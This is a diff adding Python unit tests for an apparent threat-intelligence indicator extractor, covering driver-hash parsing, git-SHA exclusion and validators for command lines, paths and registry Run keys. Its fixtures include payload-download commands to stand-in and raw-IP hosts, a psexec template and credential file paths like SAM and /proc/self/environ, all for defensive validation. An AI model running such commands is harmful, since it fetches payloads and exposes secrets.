@@ -1326,6 +1326,109 @@ def test_html_rendered_scan_keeps_table_cells_apart():
     assert "pobelstudio.com" not in glued or rendered  # the renderer is what the stage scans now
 
 
+def test_driver_yaml_certificate_and_richpe_hashes_never_nominate():
+    """LOLDrivers-style YAML: the sample's own hashes and its Authentihash
+    stage; certificate TBS digests and the RichPE header hash do not."""
+    md5, sha256, authenti, richpe, tbs1, tbs256 = (
+        "e" * 31 + "f",
+        "9" * 63 + "8",
+        "c" * 63 + "d",
+        "a" * 63 + "b",
+        "1" * 39 + "2",
+        "3" * 63 + "4",
+    )
+    yaml = (
+        "KnownVulnerableSamples:\n"
+        "- Filename: evil.sys\n"
+        f"  MD5: {md5}\n"
+        f"  SHA256: {sha256}\n"
+        "  Authentihash:\n"
+        f"    SHA256: {authenti}\n"
+        "  RichPEHeaderHash:\n"
+        f"    SHA256: {richpe}\n"
+        "  Signatures:\n"
+        "  - Certificates:\n"
+        "    - Subject: CN=Vendor\n"
+        "      TBS:\n"
+        f"        SHA1: {tbs1}\n"
+        f"        SHA256: {tbs256}\n"
+    )
+    got = {c.value for c in scan_candidates(yaml)}
+    assert got == {md5, sha256, authenti}
+    # Same-line labels.
+    assert scan_candidates(f"Certificate thumbprint: {tbs1}") == []
+    assert scan_candidates(f"TBS SHA256 {tbs256}") == []
+    # A certificate named earlier in the sentence doesn't label the file's hash.
+    assert [c.value for c in scan_candidates(f"The driver is signed with a stolen certificate; SHA256: {sha256}")] == [
+        sha256
+    ]
+
+
+def test_git_commit_shas_never_nominate_as_sha1():
+    h = lambda c: c * 39 + "2"  # noqa: E731
+    for text in (
+        f"| Commit | {h('1')} | fix parser |",
+        f"git checkout {h('3')}",
+        f"Reverted {h('4')} upstream",
+        f"{h('5')}\nAuthor: bob <bob@example.com>",
+    ):
+        assert scan_candidates(text) == [], text
+    # A SHA1 the article calls a sample still nominates, GitHub or not.
+    assert [c.value for c in scan_candidates(f"Loader SHA1 {h('6')} from the GitHub release")] == [h("6")]
+    assert [c.value for c in scan_candidates(f"SHA1: {h('7')}")] == [h("7")]
+
+
+def test_cmdline_templates_with_placeholders_are_rejected():
+    for bad in (
+        "psexec.exe \\\\<TARGET> -u <USER> -p <PASS> cmd.exe",
+        "curl -o /tmp/x http://[ATTACKER_IP]/x.sh",
+        "wget http://{{c2}}/payload.sh -O /tmp/p",
+    ):
+        assert validate_kind_value("cmdline", bad) is None, bad
+    for good in ("curl -o /tmp/x http://45.1.2.3/x.sh", "cmd /c echo test > C:\\temp\\out.txt"):
+        assert validate_kind_value("cmdline", good) == good, good
+
+
+def test_path_validator_rejects_wellknown_files_and_loopback_shares():
+    for bad in (
+        "/var/log/auth.log",
+        "/var/log/nginx/access.log",
+        "/proc/self/environ",
+        "/etc/os-release",
+        "C:\\Windows\\System32\\wsl.exe",
+        "C:\\Windows\\System32\\drivers\\etc\\hosts",
+        "C:\\Windows\\System32\\config\\SAM",
+        "\\\\127.0.0.1\\C$",
+        "\\\\127.0.0.1\\ADMIN$\\__1698251",
+        "\\\\localhost\\c$\\temp\\x.exe",
+    ):
+        assert validate_kind_value("path", bad) is None, bad
+    for good in (
+        "/var/log/.x/miner",
+        "\\\\10.1.2.3\\share\\x.exe",
+        "C:\\Windows\\System32\\phoneinfo.dll",
+    ):
+        assert validate_kind_value("path", good) == good, good
+
+
+def test_registry_validator_rejects_run_key_glued_to_a_file():
+    run = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+    for bad in (f"{run}\\update.exe", f"{run}\\C:\\Users\\Public\\a.exe", f"{run}Once\\%APPDATA%\\x"):
+        assert validate_kind_value("registry", bad) is None, bad
+    assert validate_kind_value("registry", f"{run}\\OneDriveSync") == f"{run}\\OneDriveSync".lower()
+
+
+def test_hash_evidence_naming_a_certificate_or_commit_is_vetoed():
+    from app.intelligence.observables import _hash_evidence_vetoed
+
+    assert _hash_evidence_vetoed("sha256", "TBS SHA256 hash of the signing certificate")
+    assert _hash_evidence_vetoed("sha256", "RichPEHeaderHash of the driver")
+    assert _hash_evidence_vetoed("sha1", "git commit that introduced the fix")
+    assert _hash_evidence_vetoed("sha256", "AES key used to decrypt the config")
+    assert not _hash_evidence_vetoed("sha256", "SHA256 hash of the loader")
+    assert not _hash_evidence_vetoed("domain", "TBS")
+
+
 def test_path_validator_rejects_bare_system_locations_and_single_segments():
     for bad in ("/dev/shm", "/var/tmp", "/bin/bash", "/etc/hosts", "/PSEMHUB/", "C:\\ProgramData", "/usr/lib"):
         assert validate_kind_value("path", bad) is None, bad
